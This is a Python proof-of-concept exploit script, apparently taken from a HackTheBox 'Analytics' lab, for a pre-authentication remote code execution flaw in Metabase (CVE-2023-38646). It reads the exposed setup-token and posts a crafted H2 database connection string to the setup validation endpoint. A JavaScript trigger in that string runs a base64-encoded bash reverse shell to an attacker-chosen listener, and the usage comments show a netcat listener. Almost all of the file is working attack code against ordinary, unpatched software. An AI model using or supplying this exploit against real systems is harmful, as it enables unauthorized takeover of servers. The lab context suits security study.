#!/usr/bin/env python3
# Fuente / Source: https://github.com/saoGITo/HTB_Analytics (HTB_Analytics_poc.py)
# Fecha de acceso / Accessed: 2026-09-24. Autor notas: Apuromafo (curaduria local).
# Maquina / Machine: HTB Analytics (Easy, retired) - RCE en Metabase via setup-token (CVE-2023-38646).
# Uso / Usage: python3 HTB_Analytics_poc.py <listener ip> <listener port>
#   1. echo "10.10.11.233 data.analytical.htb" >> /etc/hosts
#   2. nc -nvlp 4444
#   3. python3 HTB_Analytics_poc.py 10.10.14.1 4444
import requests
import sys
import subprocess
import random
import string
import json
import base64

if len(sys.argv) < 2:
    print("Usage: python3 HTB_Analytics_poc.py <listener ip> <listener port>")
    sys.exit(1)

rnb = random.randint(100000, 999999)
rstr = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))

# Define the URL
url = "http://data.analytical.htb/"

# Step 1: Encode "shell" to base64
original_text = f"sh -i &> /dev/tcp/{sys.argv[1]}/{sys.argv[2]} 0>&1"
base64_encoded = base64.b64encode(original_text.encode()).decode()

# Step 2: Count "=" characters at the end
equals_count = base64_encoded.count('=')

# Step 3: Append spaces to "shell" based on the count of "=" characters
modified_text = original_text + ' ' * equals_count

# Step 4: Encode the modified text to base64 again
final_base64_encoded = base64.b64encode(modified_text.encode()).decode()



# Send a GET request to the URL
response2 = requests.get(url + "api/session/properties")

# Check if the request was successful (status code 200)
if response2.status_code == 200:
    # Parse the JSON response
    data2 = response2.json()

    # Extract the value associated with "setup-token"
    setup_token = data2.get("setup-token")

    if setup_token:
        token = setup_token
    else:
        print("No 'setup-token' found in the response.")
else:
    print("Failed to retrieve data. Status Code:", response2.status_code)

headers = {
    "Content-Type": "application/json",
}

data = {
    "token": token,
    "details": {
        "details": {
            "db": "zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;CREATE TRIGGER " + rstr + " BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo," + final_base64_encoded + "}|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": False,
            "ssl": True
        },
        "engine": "h2",
        "name": rnb
    }
}

# Convert the data dictionary to a JSON string
json_data = json.dumps(data)

session = requests.Session()

print("[+] get reverse shell")

revshell = session.post(url + "api/setup/validate" , headers=headers, data=json_data)
